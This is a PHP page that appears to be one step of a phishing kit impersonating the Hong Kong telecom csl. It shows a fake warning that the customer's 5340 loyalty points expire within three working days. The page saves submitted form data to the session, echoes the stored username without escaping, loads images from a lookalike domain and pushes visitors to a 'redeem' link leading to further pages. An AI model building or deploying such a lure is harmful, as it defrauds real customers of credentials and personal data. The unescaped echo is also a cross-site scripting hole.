<?php
session_start();
//require_once 'config.php';
include('partials/header.php');
// include('partials/header-new.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>
<style>
    .wrap {
        padding: 30px 20px;
/*        margin-top:70px;*/
        padding-bottom: 0px;
    }
    @media only screen and (max-width: 1024px){
.planImages ul .gist[data-v-42547111] {

    font-size: 24px !important;

}
}
    a.main-logo {
        display: block;
        margin: 11px 0 25px 0;
        text-align: center;
        color: red;
        font-size: 19px;
        font-weight: bold;
    }
    .notice {
        line-height:2;
        padding: 10px;
        border-radius: 5px;
        color: #777977;
        margin: 30px 0 40px;
        background: #f0f0eb;
    }
    @media(max-width: 767px) {
        .submit-btn {
            width: 100%;
            line-height: 40px;
            text-align: center;
            display: inline-block;
            color: #000 !important;
            border-radius: 30px;
            background: linear-gradient(90deg,#fd0 0,#faa61a);
            cursor: pointer;
            margin-bottom: 20px;
        }

        .submit-btn:hover:hover {
            background-color: red;
            border-color: red;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }
</style>
<div class="wrap">
    <div data-v-42547111="" class="planImages">

<img class="hidden visible-sm-block visible-md-block visible-lg-block" src="https://csl.6nvo5.ink/files/16835194647658102.jpg">
                <img class="hidden visible-xs-block" src="https://csl.6nvo5.ink/files/16835194647680161.jpg">

<!--         <ul data-v-42547111=""><li data-v-42547111="" class="gist">積分到期提醒
</li></ul>
<img data-v-42547111="" src="https://www.three.com.mo/assets/img/bannerM.29a04b8.png" alt=""> -->


</div>
    <a href="" class="main-logo">
        <i style="color:#ffb100;font-size:26px;" class="fa fa-warning"></i>
        積分有效期提示
        <!--<img src="images/logo.png" alt="">-->
    </a>

    <div class="notice" style="font-size:13px;">

        <p>尊敬的csl客戶：<?php echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?> </p>
        <p>
            csl積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p>
        </br>
        <p>
            csl積分計劃為您帶來最新、最精彩的優惠，下載csl緊貼最新資訊，輕輕鬆鬆就可以賺取csl積分！
            積分可用於直接繳付賬單外，更可以兌換多種生活禮品包括超市禮券、咖啡現金券、儲值卡等。
            csl積分計劃為您帶來最新、最精彩的優惠積分碼的條款及細則
            除非另有規定，每個csl積分只能使用一次。合資格客戶可於商戶發送csl積分時所展示之條款及細則查閱其csl積分碼之指定兌換有效期。csl積分碼必須於指定兌換有效期前，於csl兌換成csl積分。csl積分碼逾期將作廢並自動註銷，且不獲補發或延長兌換有效期。
            </br>
            如有任何爭議，csl香港將保留一切最終決定權。
        </p>
    </div>
    <div class="center">
        <a href="page6.php" class="btn submit-btn">積分兌換</a>
    </div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
include('partials/footer-new.php');
